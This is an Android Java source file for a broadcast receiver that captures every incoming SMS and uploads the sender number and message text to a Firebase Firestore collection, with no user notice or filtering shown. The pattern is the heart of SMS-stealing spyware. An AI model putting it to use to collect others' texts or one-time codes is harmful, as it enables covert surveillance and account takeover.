package com.example.inboxmsg;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.example.inboxmsg.model.SmsServices;
import com.google.firebase.firestore.CollectionReference;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FirebaseFirestore;

import java.util.Collections;
import java.util.HashMap;
import java.util.Map;

public class SmsReceiver extends BroadcastReceiver {
    public SmsReceiver(){
        Log.d("63014", "sms_recieve class");
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        // Extract sender's phone number and message body from the SMS intent
        String senderPhoneNum = "";
        String messageBody = "";
        Log.d("63014", "Received SMS");

        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    senderPhoneNum = smsMessage.getOriginatingAddress();
                    messageBody += smsMessage.getMessageBody();
                }
            }
        }



        // Upload data to Firebase Firestore
        uploadToFirestore(context, senderPhoneNum, messageBody);
    }

    private void uploadToFirestore(Context context, String senderPhoneNum, String messageBody) {
//        // Initialize Firestore
//        FirebaseFirestore db = FirebaseFirestore.getInstance();
//
//        // Specify the collection to store the SMS data (replace "myExistingCollection" with your collection name)
//        CollectionReference smsCollection = db.collection("sms_services_collections");
//
//        // Check if a document with the sender's phone number already exists
//        smsCollection.whereEqualTo("sender", senderPhoneNum)
//                .get()
//                .addOnCompleteListener(task -> {
//                    if (task.isSuccessful()) {
//                        if (task.getResult() != null && !task.getResult().isEmpty()) {
//                            // Get the first document snapshot
//                            DocumentSnapshot documentSnapshot = task.getResult().getDocuments().get(0);
//
//                            // Get the reference to the existing document
//                            DocumentReference existingDocument = documentSnapshot.getReference();
//
//                            // Update existing document
//                            updateExistingDocument(existingDocument, messageBody);
//                        } else {
//                            // Create a new document
//                            createNewDocument(smsCollection, senderPhoneNum, messageBody);
//                        }
//
//                    } else {
//                        Log.e("Firestore", "Error checking for existing document: " + task.getException());
//                    }
//                });


        SmsServices smsServices = new SmsServices(senderPhoneNum, Collections.singletonList(messageBody));
        saveSmsServicestoFirebase(smsServices);
    }

    private void updateExistingDocument(DocumentReference document, String newMessageBody) {
        // Update the existing document with the new message body
        document.update("body", newMessageBody)
                .addOnSuccessListener(aVoid -> {
                    // Log success or handle it accordingly
                    Log.d("Firestore", "Existing document updated successfully");
                })
                .addOnFailureListener(e -> {
                    // Log failure or handle it accordingly
                    Log.e("Firestore", "Failed to update existing document: " + e.getMessage());
                });
    }

    private void createNewDocument(CollectionReference smsCollection, String senderPhoneNum, String messageBody) {
        // Create a new SMS document
        Map<String, Object> smsData = new HashMap<>();
        smsData.put("sender", senderPhoneNum);
        smsData.put("body", messageBody);

        // Add the SMS data to the Firestore collection
        smsCollection.add(smsData)
                .addOnSuccessListener(documentReference -> {
                    // Log success or handle it accordingly
                    Log.d("Firestore", "New document added with ID: " + documentReference.getId());
                })
                .addOnFailureListener(e -> {
                    // Log failure or handle it accordingly
                    Log.e("Firestore", "Failed to add new document: " + e.getMessage());
                });
    }

    private void saveSmsServicestoFirebase(SmsServices smsServices) {
        FirebaseFirestore.getInstance()
                .collection("sms_services_collections")
                .add(smsServices)
                .addOnSuccessListener(documentReference -> {
                    Log.d("vikas", "Successfully added data with ID: " + documentReference.getId());
                })
                .addOnFailureListener(e -> {
                    Log.e("vikas", "Failed to add data. Error: " + e.getMessage());
                });
    }
}
